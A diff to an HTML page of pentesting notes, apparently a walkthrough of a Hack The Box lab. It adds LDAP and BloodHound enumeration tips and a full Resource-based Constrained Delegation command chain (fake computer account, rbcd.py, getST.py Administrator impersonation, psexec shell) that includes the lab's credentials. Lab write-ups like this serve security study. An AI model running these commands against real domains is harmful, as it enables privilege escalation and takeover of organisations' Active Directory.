@@ -26,12 +26,52 @@
             <h2>Enumeration</h2>
             <p> Basic SMB enumeration to check if it vulnerable to SMB relay. Additionally you can get the <b>domain name</b></p>
             <pre><code class="language-bash">crackmapexec smb 10.10.11.174</code></pre>
+            <p> To dump all ldap information</p>
+            <pre><code class="language-bash">ldapsearch -H ldap://DOMAIN_NAME -D 'USER@DOMAIN_NAME' -w 'PASSWORD' -b 'dc=DOMAIN_NAME,dc=SECOND_DOMAIN_NAME'</code></pre>
 
             <h3> BloodHound </h3>
             <p> Utility to gather more information when a <b>user and password have been gathered</b></p>
             <pre><code class="language-bash">bloodhound-python --dns-tcp -ns TARGET_IP -d DOMAIN -u 'USER' -p 'PASS' -c all</code></pre>
+            
+            <p>Inside bloodhound panel it is important to check the following Pre-build Searches</p>
+            <ul>
+                <li> All kerberoasteable users</li>
+                <li> Shortest paths to system trusted for unconstrained delegation (In case you see a user this one can be the entry vector)</li>
+                <li> Shortest paths to domain admins (In case you see a user this one can be the entry vector)</li> 
+            </ul>
+
+            <p> Default groups and users have Object ID over 500 so in case you see and object with priveleges that is not default it may be an entry vector</p>
+            <p> Ej: Object ID:S-1-5-21-1677581083-3380853377-188903654-<b>1103</b></p>
+
+            <p> In case you see permision <b>"(GenericAll/GenericWrite/WriteDacl/WriteProperty/etc)"</b> in a group that is not default it may be suspicious. It that case click on it and follow the commands it says</p>
+
+            <h2>Exploitation</h2>
+            <h3> Resource-based Constrained Delegation</h3>
+            <p> RBCD is an attack technique in Active Directory where an attacker abuses a legitimate Kerberos delegation feature to impersonate any user, including domain admins, to access services on a target machine.</p>
+            <p> Any user with write permissions over a machine account (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) can set the msDS-AllowedToActOnBehalfOfOtherIdentity (In the other forms of Delegation you needed domain admin privs).</p>
+            <p> The attack goes the following way</p>
+            <ul>
+                <li>The attacker creates or controls a machine account (FakePC$).</li>
+                <li>They modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a target server to allow FakePC$ to delegate to it. </li>
+                <li>Using tools like Rubeus, the attacker requests a Kerberos ticket (TGS) as a high-privileged user (e.g., Administrator) to access services on the target server.</li>
+                <li>The KDC issues the ticket because delegation is allowed — no need to know the administrator's password.</li>
+            </ul>
+            <p> To perform this attack you can follow "literally" the commands that bloodhound provides eventhough we used a tool that automates the process</p>
+            <p> Tool: <a class="notion-link" href="https://github.com/tothi/rbcd-attack/blob/master/README.md"> rbcd.py </a></p>
+            <p> Creating fake computer </p>
+            <pre><code class="language-bash">python3 addcomputer.py -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful</code></pre>
+            <p>Modifiying delegation rights</p>
+            <pre><code class="language-bash">python3 rbcd.py -f EVILCOMPUTER -t DC -dc-ip 10.10.11.174  support\\support:Ironside47pleasure40Watchful</code></pre>
+            <p>Getting the impersonated service ticket</p>
+            <pre><code class="language-bash">python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/EVILCOMPUTER$:ev1lP@sS</code></pre>
+            <p> Exporting ticket and connecting to machine</p>
+            <pre><code class="language-bash">export KRB5CCNAME=Administrator.ccache
+python3 psexec.py -k dc.support.htb</code></pre>
+           
+            
 
             
+
         </div>
     </div>
 
